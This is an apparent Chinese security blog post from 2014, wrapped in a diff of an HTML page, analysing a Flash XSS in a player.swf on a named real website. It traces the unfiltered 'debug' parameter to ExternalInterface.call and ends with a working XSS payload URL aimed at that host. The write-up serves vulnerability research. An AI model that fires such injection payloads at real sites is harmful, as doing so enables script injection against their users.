@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>简单分析个 flash xss | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="url: http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swfwget 下来，反编译，看到是as3 的，搜索 loaderinfo，发现:
+1234567891011public function loadConfig():void&amp;#123;    this.loadCookies();    if (this.xm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单分析个 flash xss">
+<meta property="og:url" content="http://sh3ll.me/2014/03/13/a-simple-flash-xss/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="url: http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swfwget 下来，反编译，看到是as3 的，搜索 loaderinfo，发现:
+1234567891011public function loadConfig():void&amp;#123;    this.loadCookies();    if (this.xm">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="简单分析个 flash xss">
+<meta name="twitter:description" content="url: http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swfwget 下来，反编译，看到是as3 的，搜索 loaderinfo，发现:
+1234567891011public function loadConfig():void&amp;#123;    this.loadCookies();    if (this.xm">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-a-simple-flash-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      简单分析个 flash xss
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-03-13T01:44:39.000Z" itemprop="datePublished">03-13-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pentest/">Pentest</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>url: <a href="http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf" target="_blank" rel="external">http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf</a><br>wget 下来，反编译，看到是as3 的，搜索 loaderinfo，发现:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">public function loadConfig():void&#123;</div><div class="line">    this.loadCookies();</div><div class="line">    if (this.xmlConfig)&#123;</div><div class="line">        this.loadXML(this.xmlConfig);</div><div class="line">    &#125; else &#123;</div><div class="line">        this.loadFlashvars(RootReference.root.loaderInfo.parameters);</div><div class="line">    &#125;;</div><div class="line">&#125;</div><div class="line">```&lt;!--more--&gt;</div><div class="line"></div><div class="line">可以看到 loaderinfo.parameters 被带入了 loadFlashvars，搜索这个函数，看看它是怎么定义的：</div></pre></td></tr></table></figure>
+<p>public function loadFlashvars(_arg1:Object):void{<br>    var param:<em> = null;<br>    var params:</em> = _arg1;<br>    try {<br>        for (param in params) {<br>            this.setConfigParam(param, params[param]);<br>        };<br>        dispatchEvent(new Event(Event.COMPLETE));<br>    } catch(e:Error) {<br>        dispatchEvent(new ErrorEvent(ErrorEvent.ERROR, false, false, e.message));<br>    };<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">看到这句</div></pre></td></tr></table></figure></p>
+<p>this.setConfigParam(param, params[param]);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">然后跟踪 setConfigParam，</div></pre></td></tr></table></figure></p>
+<p>private function setConfigParam(_arg1:String, _arg2:String):void{<br>    this._config[_arg1.toLowerCase()] = Strings.serialize(Strings.decode(_arg2));<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">这里可以看到参数被传到了 config 中，然后我们再看对 config 进行了那些调用，搜索_config：</div></pre></td></tr></table></figure></p>
+<p>private static function send(_arg1:String):void{<br>    var _local2:String = (_config) ? _config.debug : TRACE;<br>    switch (_local2){<br>        case ARTHROPOD:<br>            CONNECTION.send(CONNECTION_NAME, “debug”, “CDC309AF”, _arg1, 0xCCCCCC);<br>            break;<br>        case CONSOLE:<br>            if (ExternalInterface.available){<br>                ExternalInterface.call(“console.log”, _arg1);<br>            };<br>            break;<br>        case TRACE:<br>            trace(_arg1);<br>            break;<br>        case NONE:<br>            break;<br>        default:<br>            if (ExternalInterface.available){<br>                ExternalInterface.call(_config.debug, _arg1);<br>            };<br>    };<br>}<br>```</p>
+<p>此时已经明了，debug 参数未经过滤最后被 ExternalInterface.call 调用了，于是我们构造如下：<br><a href="http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf?debug=alert(/ hello,world/));}catch(e){};//" target="_blank" rel="external">http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf?debug=alert(/ hello,world/));}catch(e){};//</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/03/13/a-simple-flash-xss/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/03/13/script-in-innerHTML/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          innerHTML 中script 的加载与执行
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/03/13/python-break-multi-loops/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Python 跳出多层循环</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/03/13/a-simple-flash-xss/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
